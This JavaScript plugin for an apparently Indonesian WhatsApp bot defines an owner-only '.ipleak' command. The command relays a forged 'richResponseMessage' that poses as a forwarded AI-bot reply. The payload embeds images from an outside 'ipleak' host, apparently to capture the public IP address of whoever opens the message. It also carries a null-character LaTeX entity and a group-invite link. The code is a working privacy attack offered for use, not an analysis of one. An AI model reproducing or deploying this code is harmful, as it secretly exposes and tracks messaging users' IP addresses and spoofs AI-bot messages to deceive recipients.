import config from "../../config.js";

const pluginConfig = {
  name: "ipleak",
  alias: ["ipleak"],
  category: "owner",
  description: "Cek IP publik via payload NixelGen (richResponseMessage)",
  usage: ".ipleak",
  example: ".ipleak",
  isOwner: true,
  isPremium: false,
  isGroup: false,
  isPrivate: false,
  cooldown: 5,
  energi: 0,
  isEnabled: true,
};

async function handler(m, { sock, db }) {
  
  const payload = {
    "response_id": "24f4ec25-a8b4-45b5-8cb1-d2504e3ab640",
    "sections": [
      {
        "__typename": "GenAIUnifiedResponseSection",
        "view_model": {
          "__typename": "GenAISingleLayoutViewModel",
          "primitive": {
            "__typename": "GenAIMarkdownTextUXPrimitive",
            "text": "{{NIXEL}}\u0000{{/NIXEL}}",
            "inline_entities": [
              {
                "__typename": "GenAITextInlineEntity",
                "key": "NIXEL",
                "metadata": {
                  "__typename": "GenAILatexItem",
                  "latex_expression": "\u0000",
                  "font_height": 24,
                  "padding": 4,
                  "latex_image": {
                    "__typename": "GenAIMediaItem",
                    "mime_type": "image/png",
                    "url": "https://files.catbox.moe/2rpeyy.png",
                    "url_fallback": "https://files.catbox.moe/2rpeyy.png",
                    "width": 417.3913043478261,
                    "height": 117.3913043478261,
                    "expiration_timestamp_ms": 1786618500000
                  }
                }
              }
            ]
          }
        }
      },
      {
        "view_model": {
          "primitive": {
            "__typename": "GenAIImagePrimitive",
            "preview_image": {
              "__typename": "GenAIMediaItem",
              "mime_type": "image/jpeg",
              "url": "https://ipleak.nixel.dev/image/ip?timestamp=" + Date.now()
            },
            "full_image": {
              "__typename": "GenAIMediaItem",
              "mime_type": "image/jpeg",
              "url": "https://ipleak.nixel.dev/image/ip?timestamp=" + Date.now()
            }
          },
          "__typename": "GenAISingleLayoutViewModel"
        }
      },
      {
        "view_model": {
          "primitive": {
            "__typename": "GenAIFooterActionPrimitive",
            "cta_text": "WhatsApp Group",
            "cta_type": "OPEN_URL",
            "cta_url": "https://chat.whatsapp.com/DRirs6nV3073MR6JvaSRrS?s=cl&p=a&ilr=0"
          },
          "__typename": "GenAISingleLayoutViewModel"
        }
      }
    ]
  };

  const base64Data = Buffer.from(JSON.stringify(payload)).toString('base64');

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: base64Data
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "0@bot"
            },
            forwardOrigin: 4
          }
        }
      }
    }
  };

  try {
    await sock.relayMessage(m.chat, message, {});
    await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
  } catch (e) {
    await m.reply(`❌ *Gagal mengirim IP Leak*\n\n_Error: ${e?.message || e}_`);
  }
}

export { pluginConfig as config, handler };